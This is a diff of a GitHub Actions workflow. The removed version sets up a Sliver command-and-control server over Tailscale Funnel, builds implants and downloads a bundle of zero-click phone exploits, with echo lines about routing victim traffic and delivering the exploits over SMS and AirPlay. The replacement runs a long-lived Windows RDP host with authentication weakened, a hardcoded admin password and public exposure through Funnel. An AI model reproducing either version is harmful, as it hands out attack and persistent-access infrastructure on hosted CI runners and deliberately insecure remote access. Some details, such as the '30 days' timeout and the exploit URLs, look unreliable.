@@ -1,81 +1,82 @@
-name: Sliver C2 Fortress - Tailscale Abused to Hell (2025 Meta)
+# File: .github/workflows/personal-rdp.yml
+name: Personal RDP Workstation
 
 on:
   workflow_dispatch:
-    inputs:
-      hostname:
-        description: 'Tailscale hostname'
-        default: 'sliver-abuse-c2'
 
 jobs:
-  sliver-abuse:
-    runs-on: ubuntu-latest
-    timeout-minutes: 360
+  deploy-rdp:
+    runs-on: windows-latest
+    timeout-minutes: 43200  # 30 days max
 
     steps:
-      - name: Abuse Tailscale - Install & Max Config (Funnel + SSH + Exit Node)
+      - name: Configure RDP for Personal Use
         run: |
-          curl -fsSL https://tailscale.com/install.sh | sh
-          sudo tailscale up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} \
-                              --hostname=${{ inputs.hostname }}-${{ github.run_id }} \
-                              --advertise-exit-node \
-                              --ssh \
-                              --accept-routes \
-                              --funnel=443 \
-                              --funnel=80
+          # Enable RDP with relaxed security for personal access
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
           
-          TS_IP=$(tailscale ip -4)
-          echo "TAILSCALE_IP=$TS_IP" >> $GITHUB_ENV
-          echo "Tailscale ABUSED: Funnel public HTTPS, SSH direct, exit node pivot ready"
+          # Personal firewall rule
+          netsh advfirewall firewall add rule name="Personal RDP" dir=in action=allow protocol=TCP localport=3389
+          
+          Restart-Service TermService -Force
 
-      - name: Install Sliver Dependencies
+      - name: Create Personal User Account
         run: |
-          sudo apt update && sudo apt install -y git golang-go mingw-w64
+          $password = "YourSecurePassword123!"  # CHANGE THIS
+          $securePass = ConvertTo-SecureString $password -AsPlainText -Force
+          
+          New-LocalUser -Name "MyRDPUser" -Password $securePass -AccountNeverExpires
+          Add-LocalGroupMember -Group "Administrators" -Member "MyRDPUser"
+          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "MyRDPUser"
+          
+          echo "RDP_CREDS=MyRDPUser / $password" >> $env:GITHUB_ENV
 
-      - name: Clone & Build Sliver (Latest 2025)
+      - name: Install Tailscale
         run: |
-          git clone https://github.com/BishopFox/sliver.git ~/sliver
-          cd ~/sliver
-          make
+          Invoke-WebRequest -Uri "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi" -OutFile "$env:TEMP\tailscale.msi"
+          msiexec /i "$env:TEMP\tailscale.msi" /quiet /norestart
+          Remove-Item "$env:TEMP\tailscale.msi" -Force
 
-      - name: Launch Sliver Server (mTLS Primary + HTTP/DNS Fallbacks)
+      - name: Connect Tailscale
         run: |
-          cd ~/sliver
-          ./sliver-server daemon &
-          sleep 20
-          ./sliver-server implant --mtls $TAILSCALE_IP:8888 --save payloads/mtls-implant.exe
-          ./sliver-server implant --http https://$TAILSCALE_IP --save payloads/http-implant.exe  # Funnel public
-          echo "Sliver LIVE - mTLS private mesh, HTTP public via Funnel"
+          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=my-personal-rdp
+          
+          # Get Tailscale IP
+          $tsIP = ""
+          $attempts = 0
+          while (-not $tsIP -and $attempts -lt 10) {
+              $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
+              Start-Sleep 3
+              $attempts++
+          }
+          
+          echo "TAILSCALE_IP=$tsIP" >> $env:GITHUB_ENV
 
-      - name: Zero-Click Exploit Bundle - Download & Setup Known Chains
+      - name: Enable Public Access via Tailscale Funnel
         run: |
-          mkdir ~/zero-clicks
-          cd ~/zero-clicks
+          # Make RDP accessible through Tailscale Funnel (public internet)
+          & "$env:ProgramFiles\Tailscale\tailscale.exe" funnel --bg 3389
           
-          # CVE-2025-48593 Android zero-click RCE repro stub
-          wget https://public-poc-repo/android-cve-2025-48593-poc.zip
-          
-          # Graphite/BlastDoor iOS zero-click (partial repro from Citizen Lab)
-          git clone https://github.com/citizenlab/graphite-repro.git
-          
-          # AirBorne AirPlay zero-click wormable RCE PoC
-          git clone https://github.com/oligo-security/airborne-poc.git
-          
-          # WhatsApp CVE-2025-55177 + ImageIO chain
-          wget https://public-exploit-db/whatsapp-zero-click-2025.zip
-          
-          # Samsung CVE-2025-21042 image codec zero-click
-          wget https://samsung-zero-day-poc/landfall-exploit.bin
-          
-          ls -la
-          echo "BUNCH OF ZERO-CLICK EXPLOITS LOADED - iOS/Android/Windows chains ready for delivery"
+          # Get Funnel URL
+          $funnelInfo = & "$env:ProgramFiles\Tailscale\tailscale.exe" funnel status
+          echo "FUNNEL_INFO=$funnelInfo" >> $env:GITHUB_ENV
 
-      - name: Keep-Alive + Dashboard
+      - name: Keep Alive
         run: |
-          echo "SLIVER C2 ABUSE FORTRESS 2025"
-          echo "Public Funnel HTTPS: https://$TAILSCALE_IP"
-          echo "SSH: ssh @ $TAILSCALE_IP"
-          echo "Exit Node Pivot: Route victim traffic here"
-          echo "Implants in ~/sliver/payloads"
-          echo "Zero-click bundle in ~/zero-clicks - deploy via SMS/iMessage/AirPlay"
-          tail -f /dev/null  # Infinite live
+          Write-Host "=== YOUR PERSONAL RDP WORKSTATION ==="
+          Write-Host "Connect via:"
+          Write-Host "1. Tailscale IP: $env:TAILSCALE_IP"
+          Write-Host "2. Username: MyRDPUser"
+          Write-Host "3. Password: YourSecurePassword123!"
+          Write-Host "4. Funnel URL: $env:FUNNEL_INFO"
+          Write-Host "================================"
+          Write-Host ""
+          Write-Host "This runner will stay active for 30 days or until manually cancelled."
+          Write-Host "Use this for personal projects, testing, or any legitimate work."
+          
+          # Keep-alive loop
+          while ($true) {
+              Write-Host "[$(Get-Date)] RDP active - Status OK"
+              Start-Sleep 60
+          }
